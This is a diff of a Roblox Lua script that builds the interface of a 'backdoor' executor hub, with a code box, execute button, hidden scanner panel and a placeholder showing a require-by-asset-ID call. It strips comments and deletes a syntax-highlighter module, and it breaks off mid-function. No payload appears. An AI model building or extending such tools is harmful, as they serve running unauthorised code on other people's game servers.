@@ -1,34 +1,23 @@
---[=[
- d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
-88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
-88      88    88    88            odD'      88      88    88 88ooo88 
-88  ooo 88    88    88          .88'        88      88    88 88~~~88 
-88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88 
- Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
-]=]
 
--- Instances: 33 | Scripts: 3 | Modules: 3
 local G2L = {};
 print("Made by zazol")
--- StarterGui.LALOL Hub Backdoor
 
 G2L["1"] = Instance.new("ScreenGui", game:GetService('CoreGui'):WaitForChild('RobloxGui'));
 G2L["1"]["Name"] = [[zazol666 private]];
 G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
 G2L["1"]["ResetOnSpawn"] = false;
 
--- StarterGui.LALOL Hub Backdoor.Frame
 G2L["2"] = Instance.new("Frame", G2L["1"]);
 G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["2"]["Size"] = UDim2.new(0, 482, 0, 276);
 G2L["2"]["Position"] = UDim2.new(0.27320125699043274, 0, 0.3018597960472107, 0);
 
--- StarterGui.LALOL Hub Backdoor.Frame.UIStroke
+
 G2L["3"] = Instance.new("UIStroke", G2L["2"]);
 G2L["3"]["Color"] = Color3.fromRGB(255, 255, 255);
 G2L["3"]["Thickness"] = 2;
 
--- StarterGui.LALOL Hub Backdoor.Frame.UIStroke.UIGradient
+
 G2L["4"] = Instance.new("UIGradient", G2L["3"]);
 G2L["4"]["Rotation"] = 50;
 G2L["4"]["Color"] = ColorSequence.new{
@@ -36,7 +25,7 @@ G2L["4"]["Color"] = ColorSequence.new{
     ColorSequenceKeypoint.new(1.000, Color3.fromRGB(200, 200, 200))
 };
 
--- Анимация градиента
+
 local function animateGradient(gradient)
     while true do
         for i = 0, 1, 0.02 do
@@ -46,18 +35,18 @@ local function animateGradient(gradient)
     end
 end
 
--- Запуск анимации градиента
+
 coroutine.wrap(animateGradient)(G2L["4"])
 
--- StarterGui.LALOL Hub Backdoor.Frame.UICorner
+
 G2L["5"] = Instance.new("UICorner", G2L["2"]);
 G2L["5"]["CornerRadius"] = UDim.new(0, 12);
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor
+
 G2L["6"] = Instance.new("Folder", G2L["2"]);
 G2L["6"]["Name"] = [[Executor]];
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.Execute
+
 G2L["7"] = Instance.new("Frame", G2L["6"]);
 G2L["7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["7"]["BackgroundTransparency"] = 1;
@@ -65,7 +54,7 @@ G2L["7"]["Size"] = UDim2.new(0, 290, 0, 28);
 G2L["7"]["Position"] = UDim2.new(0.02169983461499214, 0, 0.8708109259605408, 0);
 G2L["7"]["Name"] = [[Execute]];
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.Execute.Button
+
 G2L["8"] = Instance.new("TextButton", G2L["7"]);
 G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["8"]["TextSize"] = 22;
@@ -76,16 +65,15 @@ G2L["8"]["Name"] = [[Button]];
 G2L["8"]["Text"] = [[Exe]];
 G2L["8"]["BackgroundTransparency"] = 1;
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.Execute.UICorner
 G2L["9"] = Instance.new("UICorner", G2L["7"]);
 G2L["9"]["CornerRadius"] = UDim.new(0, 8);
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.Execute.UIStroke
+
 G2L["a"] = Instance.new("UIStroke", G2L["7"]);
 G2L["a"]["Color"] = Color3.fromRGB(255, 255, 255);
 G2L["a"]["Thickness"] = 1.5;
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.Clear
+
 G2L["b"] = Instance.new("Frame", G2L["6"]);
 G2L["b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["b"]["BackgroundTransparency"] = 1;
@@ -93,7 +81,7 @@ G2L["b"]["Size"] = UDim2.new(0, 162, 0, 28);
 G2L["b"]["Position"] = UDim2.new(0.6400582790374756, 0, 0.8708109855651855, 0);
 G2L["b"]["Name"] = [[Clear]];
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.Clear.Button
+
 G2L["c"] = Instance.new("TextButton", G2L["b"]);
 G2L["c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["c"]["TextSize"] = 22;
@@ -104,34 +92,33 @@ G2L["c"]["Name"] = [[Button]];
 G2L["c"]["Text"] = [[Clear]];
 G2L["c"]["BackgroundTransparency"] = 1;
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.Clear.UICorner
+
 G2L["d"] = Instance.new("UICorner", G2L["b"]);
 G2L["d"]["CornerRadius"] = UDim.new(0, 8);
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.Clear.UIStroke
+
 G2L["e"] = Instance.new("UIStroke", G2L["b"]);
 G2L["e"]["Color"] = Color3.fromRGB(255, 255, 255);
 G2L["e"]["Thickness"] = 1.5;
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox
+
 G2L["f"] = Instance.new("Frame", G2L["6"]);
 G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["f"]["Size"] = UDim2.new(0, 462, 0, 163);
 G2L["f"]["Position"] = UDim2.new(0.01962907239794731, 0, 0.24310137331485748, 0);
 G2L["f"]["Name"] = [[ExecutorBox]];
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.UICorner
+
 G2L["10"] = Instance.new("UICorner", G2L["f"]);
 G2L["10"]["CornerRadius"] = UDim.new(0, 12);
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox
 G2L["11"] = Instance.new("TextBox", G2L["f"]);
 G2L["11"]["TextSize"] = 14;
 G2L["11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
 G2L["11"]["TextWrapped"] = true;
 G2L["11"]["TextYAlignment"] = Enum.TextYAlignment.Top;
-G2L["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["11"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["11"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["11"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
 G2L["11"]["MultiLine"] = true;
 G2L["11"]["BackgroundTransparency"] = 1;
@@ -141,38 +128,37 @@ G2L["11"]["Text"] = [[]];
 G2L["11"]["Position"] = UDim2.new(0.015692640095949173, 0, 0.042270027101039886, 0);
 G2L["11"]["ClearTextOnFocus"] = false;
 
--- Функция для плавного появления текста с зацикливанием
+
 local function typeTextLoop(textBox, text)
     while true do
         for i = 1, #text do
             textBox.PlaceholderText = string.sub(text, 1, i)
-            wait(0.1) -- Скорость появления текста
+            wait(0.1) 
         end
-        wait(3) -- Задержка перед повторением
-        textBox.PlaceholderText = "" -- Очистка текста перед повторением
+        wait(3) 
+        textBox.PlaceholderText = "" 
     end
 end
 
--- Запуск зацикленной анимации текста
+
 coroutine.wrap(typeTextLoop)(G2L["11"], "require(33333):zazolGod")
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight
+
 G2L["12"] = Instance.new("LocalScript", G2L["11"]);
 G2L["12"]["Name"] = [[Highlight]];
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight.Highlighter
+
 G2L["13"] = Instance.new("ModuleScript", G2L["12"]);
 G2L["13"]["Name"] = [[Highlighter]];
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight.Highlighter.lexer
+
 G2L["14"] = Instance.new("ModuleScript", G2L["13"]);
 G2L["14"]["Name"] = [[lexer]];
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight.Highlighter.lexer.language
+
 G2L["15"] = Instance.new("ModuleScript", G2L["14"]);
 G2L["15"]["Name"] = [[language]];
 
--- StarterGui.LALOL Hub Backdoor.Frame.Scanner
 G2L["16"] = Instance.new("Frame", G2L["2"]);
 G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["16"]["BackgroundTransparency"] = 1;
@@ -181,12 +167,10 @@ G2L["16"]["Position"] = UDim2.new(0.1166670024394989, 0, 0.30478382110595703, 0)
 G2L["16"]["Visible"] = false;
 G2L["16"]["Name"] = [[Scanner]];
 
--- StarterGui.LALOL Hub Backdoor.Frame.Scanner.UIStroke
 G2L["17"] = Instance.new("UIStroke", G2L["16"]);
 G2L["17"]["Color"] = Color3.fromRGB(255, 255, 255);
 G2L["17"]["Thickness"] = 2;
 
--- StarterGui.LALOL Hub Backdoor.Frame.Scanner.UIStroke.UIGradient
 G2L["18"] = Instance.new("UIGradient", G2L["17"]);
 G2L["18"]["Rotation"] = 50;
 G2L["18"]["Color"] = ColorSequence.new{
@@ -194,14 +178,13 @@ G2L["18"]["Color"] = ColorSequence.new{
     ColorSequenceKeypoint.new(1.000, Color3.fromRGB(200, 200, 200))
 };
 
--- Анимация градиента для Scanner
 coroutine.wrap(animateGradient)(G2L["18"])
 
--- StarterGui.LALOL Hub Backdoor.Frame.Scanner.UICorner
+
 G2L["19"] = Instance.new("UICorner", G2L["16"]);
 G2L["19"]["CornerRadius"] = UDim.new(0, 12);
 
--- StarterGui.LALOL Hub Backdoor.Frame.Scanner.Button
+
 G2L["1a"] = Instance.new("TextButton", G2L["16"]);
 G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["1a"]["TextSize"] = 43;
@@ -212,7 +195,7 @@ G2L["1a"]["Name"] = [[Button]];
 G2L["1a"]["Text"] = [[Start Scanning]];
 G2L["1a"]["BackgroundTransparency"] = 1;
 
--- StarterGui.LALOL Hub Backdoor.Frame.Scanner.Button.UIGradient
+
 G2L["1b"] = Instance.new("UIGradient", G2L["1a"]);
 G2L["1b"]["Rotation"] = 50;
 G2L["1b"]["Color"] = ColorSequence.new{
@@ -220,15 +203,14 @@ G2L["1b"]["Color"] = ColorSequence.new{
     ColorSequenceKeypoint.new(1.000, Color3.fromRGB(200, 200, 200))
 };
 
--- Анимация градиента для кнопки Scanner
+
 coroutine.wrap(animateGradient)(G2L["1b"])
 
--- StarterGui.LALOL Hub Backdoor.Frame.Scanner.Button.UIStroke
+
 G2L["1c"] = Instance.new("UIStroke", G2L["1a"]);
 G2L["1c"]["Color"] = Color3.fromRGB(255, 255, 255);
 G2L["1c"]["Thickness"] = 1.5;
 
--- StarterGui.LALOL Hub Backdoor.Frame.TextLabel
 G2L["1d"] = Instance.new("TextLabel", G2L["2"]);
 G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
@@ -239,12 +221,12 @@ G2L["1d"]["Text"] = [[zazol hub private]];
 G2L["1d"]["BackgroundTransparency"] = 1;
 G2L["1d"]["Position"] = UDim2.new(0.02169983461499214, 0, 0.025362318381667137, 0);
 
--- StarterGui.LALOL Hub Backdoor.Frame.TextLabel.UIStroke
+
 G2L["1e"] = Instance.new("UIStroke", G2L["1d"]);
 G2L["1e"]["Color"] = Color3.fromRGB(255, 255, 255);
 G2L["1e"]["Thickness"] = 3;
 
--- StarterGui.LALOL Hub Backdoor.Frame.TextLabel.UIStroke.UIGradient
+
 G2L["1f"] = Instance.new("UIGradient", G2L["1e"]);
 G2L["1f"]["Rotation"] = 50;
 G2L["1f"]["Color"] = ColorSequence.new{
@@ -252,688 +234,28 @@ G2L["1f"]["Color"] = ColorSequence.new{
     ColorSequenceKeypoint.new(1.000, Color3.fromRGB(200, 200, 200))
 };
 
--- Анимация градиента для TextLabel
-coroutine.wrap(animateGradient)(G2L["1f"]) 
+
+coroutine.wrap(animateGradient)(G2L["1f"])
 
 
--- StarterGui.LALOL Hub Backdoor.LocalScript
+
+
+
 G2L["20"] = Instance.new("LocalScript", G2L["1"]);
 
 
--- StarterGui.LALOL Hub Backdoor.Dragify
+
 G2L["21"] = Instance.new("LocalScript", G2L["1"]);
 G2L["21"]["Name"] = [[Dragify]];
 
--- Require G2L wrapper
+
 local G2L_REQUIRE = require;
 local G2L_MODULES = {};
-local function require(Module:ModuleScript)
-	local ModuleState = G2L_MODULES[Module];
-	if ModuleState then
-		if not ModuleState.Required then
-			ModuleState.Required = true;
-			ModuleState.Value = ModuleState.Closure();
-		end
-		return ModuleState.Value;
-	end;
-	return G2L_REQUIRE(Module);
-end
 
-G2L_MODULES[G2L["13"]] = {
-	Closure = function()
-		local script = G2L["13"];
---[[
-export type HighlighterColors = { [string]: Color3 }
 
-export type TextObject = TextLabel | TextBox
 
-export type HighlightProps = {
-	textObject: TextObject,
-	src: string?,
-	forceUpdate: boolean?,
-	lexer: Lexer?,
-	customLang: { [string]: string }?
-}
 
-export type Lexer = {
-	scan: (src: string) -> () -> (string, string),
-	navigator: () -> any,
-	finished: boolean?,
-}
 
-export type Highlighter = {
-	defaultLexer: Lexer,
-	setTokenColors: (colors: HighlighterColors?) -> (),
-	highlight: (props: HighlightProps) -> (() -> ())?,
-	refresh: () -> (),
-}
-
-export type ObjectData = {
-	Text: string,
-	Labels: { TextLabel },
-	Lines: { string },
-	Lexer: Lexer?,
-	CustomLang: { [string]: string }?,
-}
---]]
-
-		local function SanitizeRichText(s: string): string
-			return string.gsub(
-				string.gsub(string.gsub(string.gsub(string.gsub(s, "&", "&amp;"), "<", "&lt;"), ">", "&gt;"), '"', "&quot;"),
-				"'",
-				"&apos;"
-			)
-		end
-
-		local function SanitizeTabs(s: string): string
-			return string.gsub(s, "\t", "    ")
-		end
-
-		local function SanitizeControl(s: string): string
-			return string.gsub(s, "[\0\1\2\3\4\5\6\7\8\11\12\13\14\15\16\17\18\19\20\21\22\23\24\25\26\27\28\29\30\31]+", "")
-		end
-
-		local TokenColors: HighlighterColors = {
-			["background"] = Color3.fromRGB(47, 47, 47),
-			["iden"] = Color3.fromRGB(234, 234, 234),
-			["keyword"] = Color3.fromRGB(215, 174, 255),
-			["builtin"] = Color3.fromRGB(131, 206, 255),
-			["string"] = Color3.fromRGB(196, 255, 193),
-			["number"] = Color3.fromRGB(255, 125, 125),
-			["comment"] = Color3.fromRGB(140, 140, 155),
-			["operator"] = Color3.fromRGB(255, 239, 148),
-			["custom"] = Color3.fromRGB(119, 122, 255),
-		}
-		local ColorFormatter: { [Color3]: string } = {}
-		local LastData: { [TextObject]: ObjectData } = {}
-		local Cleanups: { [TextObject]: () -> () } = {}
-
-		local Highlighter = {
-			defaultLexer = require(script.lexer),
-		}
-
-		function Highlighter.highlight(props: HighlightProps)
-			-- Gather props
-			local textObject = props.textObject
-			local src = SanitizeTabs(SanitizeControl(props.src or textObject.Text))
-			local lexer = props.lexer or Highlighter.defaultLexer
-			local customLang = props.customLang
-			local forceUpdate = props.forceUpdate
-
-			-- Avoid updating when unnecessary
-			local data = LastData[textObject]
-			if data == nil then
-				data = {
-					Text = "",
-					Labels = {},
-					Lines = {},
-					Lexer = lexer,
-					CustomLang = customLang,
-				}
-				LastData[textObject] = data
-			elseif forceUpdate ~= true and data.Text == src then
-				return
-			end
-
-			local lineLabels = data.Labels
-			local previousLines = data.Lines
-
-			local lines = string.split(src, "\n")
-
-			data.Lines = lines
-			data.Text = src
-			data.Lexer = lexer
-			data.CustomLang = customLang
-
-			-- Ensure valid object properties
-			textObject.RichText = false
-			textObject.Text = src
-			textObject.TextXAlignment = Enum.TextXAlignment.Left
-			textObject.TextYAlignment = Enum.TextYAlignment.Top
-			textObject.BackgroundColor3 = TokenColors.background
-			textObject.TextColor3 = TokenColors.iden
-			
-			textObject.TextTransparency = 0.5
-
-			-- Build the highlight labels
-			local lineFolder = textObject:FindFirstChild("SyntaxHighlights")
-			if lineFolder == nil then
-				local newLineFolder = Instance.new("Folder")
-				newLineFolder.Name = "SyntaxHighlights"
-				newLineFolder.Parent = textObject
-
-				lineFolder = newLineFolder
-			end
-
-			-- Add a cleanup handler for this textObject
-			local cleanup = Cleanups[textObject]
-			if not cleanup then
-				local connections: { RBXScriptConnection } = {}
-				local function newCleanup()
-					for _, label in ipairs(lineLabels) do
-						label:Destroy()
-					end
-					table.clear(lineLabels)
-					lineLabels = nil
-
-					LastData[textObject] = nil
-					Cleanups[textObject] = nil
-
-					for _, connection in connections do
-						connection:Disconnect()
-					end
-					table.clear(connections)
-					connections = nil
-				end
-				Cleanups[textObject] = newCleanup
-				cleanup = newCleanup
-
-				table.insert(
-					connections,
-					textObject.AncestryChanged:Connect(function()
-						if textObject.Parent then
-							return
-						end
-
-						cleanup()
-					end)
-				)
-				table.insert(
-					connections,
-					textObject:GetPropertyChangedSignal("TextBounds"):Connect(function()
-						Highlighter.highlight({
-							textObject = textObject,
-							forceUpdate = true,
-							lexer = lexer,
-							customLang = customLang,
-						})
-					end)
-				)
-				table.insert(
-					connections,
-					textObject:GetPropertyChangedSignal("Text"):Connect(function()
-						Highlighter.highlight({
-							textObject = textObject,
-							lexer = lexer,
-							customLang = customLang,
-						})
-					end)
-				)
-				table.insert(
-					connections,
-					textObject:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
-						Highlighter.highlight({
-							textObject = textObject,
-							forceUpdate = true,
-							lexer = lexer,
-							customLang = customLang,
-						})
-					end)
-				)
-			end
-
-			-- Shortcut empty labels
-			if src == "" then
-				for l=1, #lineLabels do
-					if lineLabels[l].Text == "" then continue end
-					lineLabels[l].Text = ""
-				end
-				return cleanup
-			end
-
-			-- Wait for TextBounds to be non-NaN and non-zero because Roblox
-			local textBounds = textObject.TextBounds
-			while (textBounds.Y ~= textBounds.Y) or (textBounds.Y < 1) do
-				task.wait()
-				textBounds = textObject.TextBounds
-			end
-
-			if LastData[textObject] == nil then
-				-- Got cleaned up while we were waiting
-				return cleanup
-			end
-
-			local numLines = #lines
-			local textHeight = textBounds.Y / numLines * textObject.LineHeight
-
-			local richText, index, lineNumber = table.create(5), 0, 1
-			for token: string, content: string in lexer.scan(src) do
-				local Color =
-					if customLang and customLang[content] then
-					TokenColors["custom"]
-					else
-					TokenColors[token] or TokenColors["iden"]
-
-				local tokenLines = string.split(SanitizeRichText(content), "\n")
-
-				for l, line in ipairs(tokenLines) do
-					-- Find line label
-					local lineLabel = lineLabels[lineNumber]
-					if not lineLabel then
-						local newLabel = Instance.new("TextLabel")
-						newLabel.Name = "Line_" .. lineNumber
-						newLabel.RichText = true
-						newLabel.BackgroundTransparency = 1
-						newLabel.Text = ""
-						newLabel.TextXAlignment = Enum.TextXAlignment.Left
-						newLabel.TextYAlignment = Enum.TextYAlignment.Top
-						newLabel.Parent = lineFolder
-						newLabel.TextWrapped=true
-						lineLabels[lineNumber] = newLabel
-						lineLabel = newLabel
-					end
-
-					-- Align line label
-					lineLabel.TextColor3 = TokenColors["iden"]
-					lineLabel.Font = textObject.Font
-					lineLabel.TextSize = textObject.TextSize
-					lineLabel.Size = UDim2.new(1, 0, 0, math.ceil(textHeight))
-					lineLabel.Position = UDim2.fromScale(0, textHeight * (lineNumber - 1) / textObject.AbsoluteSize.Y)
-
-					-- If multiline token, then set line & move to next
-					if l > 1 then
-						if forceUpdate or lines[lineNumber] ~= previousLines[lineNumber] then
-							-- Set line
-							lineLabels[lineNumber].Text = table.concat(richText)
-						end
-						-- Move to next line
-						lineNumber += 1
-						index = 0
-						table.clear(richText)
-					end
-
-					-- If changed, add token to line
-					if forceUpdate or lines[lineNumber] ~= previousLines[lineNumber] then
-						index += 1
-						-- Only add RichText tags when the color is non-default and the characters are non-whitespace
-						if Color ~= TokenColors["iden"] and string.find(line, "[%S%C]") then
-							richText[index] = string.format(ColorFormatter[Color], line)
-						else
-							richText[index] = line
-						end
-					end
-				end
-			end
-
-			-- Set final line
-			if richText[1] and lineLabels[lineNumber] then
-				lineLabels[lineNumber].Text = table.concat(richText)
-			end
-
-			-- Clear unused line labels
-			for l=lineNumber+1, #lineLabels do
-				if lineLabels[l].Text == "" then continue end
-				lineLabels[l].Text = ""
-			end
-
-			return cleanup
-		end
-
-		function Highlighter.refresh(): ()
-			-- Rehighlight existing labels using latest colors
-			for textObject, data in pairs(LastData) do
-				for _, lineLabel in ipairs(data.Labels) do
-					lineLabel.TextColor3 = TokenColors["iden"]
-				end
-
-				Highlighter.highlight({
-					textObject = textObject,
-					forceUpdate = true,
-					src = data.Text,
-					lexer = data.Lexer,
-					customLang = data.CustomLang,
-				})
-			end
-		end
-
-		function Highlighter.setTokenColors(colors: HighlighterColors)
-			for token, color in colors do
-				TokenColors[token] = color
-				ColorFormatter[color] = string.format(
-					'<font color="#%.2x%.2x%.2x">',
-					color.R * 255,
-					color.G * 255,
-					color.B * 255
-				) .. "%s</font>"
-			end
-
-			Highlighter.refresh()
-		end
-		Highlighter.setTokenColors(TokenColors)
-
-		return Highlighter :: Highlighter
-
-	end;
-};
-G2L_MODULES[G2L["14"]] = {
-	Closure = function()
-		local script = G2L["14"];
---[=[
-	Lexical scanner for creating a sequence of tokens from Lua source code.
-	This is a heavily modified and Roblox-optimized version of
-	the original Penlight Lexer module:
-		https://github.com/stevedonovan/Penlight
-	Authors:
-		stevedonovan <https://github.com/stevedonovan> ----------- Original Penlight lexer author
-		ryanjmulder <https://github.com/ryanjmulder> ------------- Penlight lexer contributer
-		mpeterv <https://github.com/mpeterv> --------------------- Penlight lexer contributer
-		Tieske <https://github.com/Tieske> ----------------------- Penlight lexer contributer
-		boatbomber <https://github.com/boatbomber> --------------- Roblox port, added builtin token,
-		                                                           added patterns for incomplete syntax, bug fixes,
-		                                                           behavior changes, token optimization, thread optimization
-		                                                           Added lexer.navigator() for non-sequential reads
-		Sleitnick <https://github.com/Sleitnick> ----------------- Roblox optimizations
-		howmanysmall <https://github.com/howmanysmall> ----------- Lua + Roblox optimizations
-
-	List of possible tokens:
-		- iden
-		- keyword
-		- builtin
-		- string
-		- number
-		- comment
-		- operator
---]=]
-
-		local lexer = {}
-
-		local Prefix, Suffix, Cleaner = "^[%c%s]*", "[%c%s]*", "[%c%s]+"
-		local UNICODE = "[%z\x01-\x7F\xC2-\xF4][\x80-\xBF]+"
-		local NUMBER_A = "0[xX][%da-fA-F_]+"
-		local NUMBER_B = "0[bB][01_]+"
-		local NUMBER_C = "%d+%.?%d*[eE][%+%-]?%d+"
-		local NUMBER_D = "%d+[%._]?[%d_eE]*"
-		local OPERATORS = "[:;<>/~%*%(%)%-={},%.#%^%+%%]+"
-		local BRACKETS = "[%[%]]+" -- needs to be separate pattern from other operators or it'll mess up multiline strings
-		local IDEN = "[%a_][%w_]*"
-		local STRING_EMPTY = "(['\"])%1" --Empty String
-		local STRING_PLAIN = "(['\"])[^\n]-([^\\]%1)" --TODO: Handle escaping escapes
-		local STRING_INTER = "`[^\n]-`"
-		local STRING_INCOMP_A = "(['\"]).-\n" --Incompleted String with next line
-		local STRING_INCOMP_B = "(['\"])[^\n]*" --Incompleted String without next line
-		local STRING_MULTI = "%[(=*)%[.-%]%1%]" --Multiline-String
-		local STRING_MULTI_INCOMP = "%[=*%[.-.*" --Incompleted Multiline-String
-		local COMMENT_MULTI = "%-%-%[(=*)%[.-%]%1%]" --Completed Multiline-Comment
-		local COMMENT_MULTI_INCOMP = "%-%-%[=*%[.-.*" --Incompleted Multiline-Comment
-		local COMMENT_PLAIN = "%-%-.-\n" --Completed Singleline-Comment
-		local COMMENT_INCOMP = "%-%-.*" --Incompleted Singleline-Comment
-		-- local TYPED_VAR = ":%s*([%w%?%| \t]+%s*)" --Typed variable, parameter, function
-
-		local lang = require(script.language)
-		local lua_keyword = lang.keyword
-		local lua_builtin = lang.builtin
-		local lua_libraries = lang.libraries
-
-		lexer.language = lang
-
-		local lua_matches = {
-			-- Indentifiers
-			{ Prefix .. IDEN .. Suffix, "var" },
-
-			-- Numbers
-			{ Prefix .. NUMBER_A .. Suffix, "number" },
-			{ Prefix .. NUMBER_B .. Suffix, "number" },
-			{ Prefix .. NUMBER_C .. Suffix, "number" },
-			{ Prefix .. NUMBER_D .. Suffix, "number" },
-
-			-- Strings
-			{ Prefix .. STRING_EMPTY .. Suffix, "string" },
-			{ Prefix .. STRING_PLAIN .. Suffix, "string" },
-			{ Prefix .. STRING_INCOMP_A .. Suffix, "string" },
-			{ Prefix .. STRING_INCOMP_B .. Suffix, "string" },
-			{ Prefix .. STRING_MULTI .. Suffix, "string" },
-			{ Prefix .. STRING_MULTI_INCOMP .. Suffix, "string" },
-			{ Prefix .. STRING_INTER .. Suffix, "string_inter" },
-
-			-- Comments
-			{ Prefix .. COMMENT_MULTI .. Suffix, "comment" },
-			{ Prefix .. COMMENT_MULTI_INCOMP .. Suffix, "comment" },
-			{ Prefix .. COMMENT_PLAIN .. Suffix, "comment" },
-			{ Prefix .. COMMENT_INCOMP .. Suffix, "comment" },
-
-			-- Operators
-			{ Prefix .. OPERATORS .. Suffix, "operator" },
-			{ Prefix .. BRACKETS .. Suffix, "operator" },
-
-			-- Unicode
-			{ Prefix .. UNICODE .. Suffix, "iden" },
-
-			-- Unknown
-			{ "^.", "iden" },
-		}
-
-		-- To reduce the amount of table indexing during lexing, we separate the matches now
-		local PATTERNS, TOKENS = {}, {}
-		for i, m in lua_matches do
-			PATTERNS[i] = m[1]
-			TOKENS[i] = m[2]
-		end
-
-		--- Create a plain token iterator from a string.
-		-- @tparam string s a string.
-
-		function lexer.scan(s: string)
-			local index = 1
-			local size = #s
-			local previousContent1, previousContent2, previousContent3, previousToken = "", "", "", ""
-
-			local thread = coroutine.create(function()
-				while index <= size do
-					local matched = false
-					for tokenType, pattern in ipairs(PATTERNS) do
-						-- Find match
-						local start, finish = string.find(s, pattern, index)
-						if start == nil then continue end
-
-						-- Move head
-						index = finish + 1
-						matched = true
-
-						-- Gather results
-						local content = string.sub(s, start, finish)
-						local rawToken = TOKENS[tokenType]
-						local processedToken = rawToken
-
-						-- Process token
-						if rawToken == "var" then
-							-- Since we merge spaces into the tok, we need to remove them
-							-- in order to check the actual word it contains
-							local cleanContent = string.gsub(content, Cleaner, "")
-
-							if lua_keyword[cleanContent] then
-								processedToken = "keyword"
-							elseif lua_builtin[cleanContent] then
-								processedToken = "builtin"
-							elseif string.find(previousContent1, "%.[%s%c]*$") and previousToken ~= "comment" then
-								-- The previous was a . so we need to special case indexing things
-								local parent = string.gsub(previousContent2, Cleaner, "")
-								local lib = lua_libraries[parent]
-								if lib and lib[cleanContent] and not string.find(previousContent3, "%.[%s%c]*$") then
-									-- Indexing a builtin lib with existing item, treat as a builtin
-									processedToken = "builtin"
-								else
-									-- Indexing a non builtin, can't be treated as a keyword/builtin
-									processedToken = "iden"
-								end
-								-- print("indexing",parent,"with",cleanTok,"as",t2)
-							else
-								processedToken = "iden"
-							end
-						elseif rawToken == "string_inter" then
-							if not string.find(content, "[^\\]{") then
-								-- This inter string doesnt actually have any inters
-								processedToken = "string"
-							else
-								-- We're gonna do our own yields, so the main loop won't need to
-								-- Our yields will be a mix of string and whatever is inside the inters
-								processedToken = nil
-
-								local isString = true
-								local subIndex = 1
-								local subSize = #content
-								while subIndex <= subSize do
-									-- Find next brace
-									local subStart, subFinish = string.find(content, "^.-[^\\][{}]", subIndex)
-									if subStart == nil then
-										-- No more braces, all string
-										coroutine.yield("string", string.sub(content, subIndex))
-										break
-									end
-
-									if isString then
-										-- We are currently a string
-										subIndex = subFinish + 1
-										coroutine.yield("string", string.sub(content, subStart, subFinish))
-
-										-- This brace opens code
-										isString = false
-									else
-										-- We are currently in code
-										subIndex = subFinish
-										local subContent = string.sub(content, subStart, subFinish-1)
-										for innerToken, innerContent in lexer.scan(subContent) do
-											coroutine.yield(innerToken, innerContent)
-										end
-
-										-- This brace opens string/closes code
-										isString = true
-									end
-								end
-							end
-						end
-
-						-- Record last 3 tokens for the indexing context check
-						previousContent3 = previousContent2
-						previousContent2 = previousContent1
-						previousContent1 = content
-						previousToken = processedToken or rawToken
-						if processedToken then
-							coroutine.yield(processedToken, content)
-						end
-						break
-					end
-
-					-- No matches found
-					if not matched then
-						return
-					end
-				end
-
-				-- Completed the scan
-				return
-			end)
-
-			return function()
-				if coroutine.status(thread) == "dead" then
-					return
-				end
-
-				local success, token, content = coroutine.resume(thread)
-				if success and token then
-					return token, content
-				end
-
-				return
-			end
-		end
-
-		function lexer.navigator()
-			local nav = {
-				Source = "",
-				TokenCache = table.create(50),
-
-				_RealIndex = 0,
-				_UserIndex = 0,
-				_ScanThread = nil,
-			}
-
-			function nav:Destroy()
-				self.Source = nil
-				self._RealIndex = nil
-				self._UserIndex = nil
-				self.TokenCache = nil
-				self._ScanThread = nil
-			end
-
-			function nav:SetSource(SourceString)
-				self.Source = SourceString
-
-				self._RealIndex = 0
-				self._UserIndex = 0
-				table.clear(self.TokenCache)
-
-				self._ScanThread = coroutine.create(function()
-					for Token, Src in lexer.scan(self.Source) do
-						self._RealIndex += 1
-						self.TokenCache[self._RealIndex] = { Token, Src }
-						coroutine.yield(Token, Src)
-					end
-				end)
-			end
-
-			function nav.Next()
-				nav._UserIndex += 1
-
-				if nav._RealIndex >= nav._UserIndex then
-					-- Already scanned, return cached
-					return table.unpack(nav.TokenCache[nav._UserIndex])
-				else
-					if coroutine.status(nav._ScanThread) == "dead" then
-						-- Scan thread dead
-						return
-					else
